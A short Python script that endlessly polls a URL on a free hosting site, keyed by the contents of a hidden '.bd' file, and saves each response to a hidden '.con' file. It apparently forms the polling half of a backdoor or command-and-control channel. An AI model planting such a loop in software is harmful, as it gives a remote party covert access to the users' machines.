import requests
import os

while True:
  bd = open('.bd', 'r')
  p = requests.get('https://dedeco.000webhostapp.com/'+bd.read())
  bd.close()
  f = open('.con', '+w')
  f.write(p.text)
  f.close()
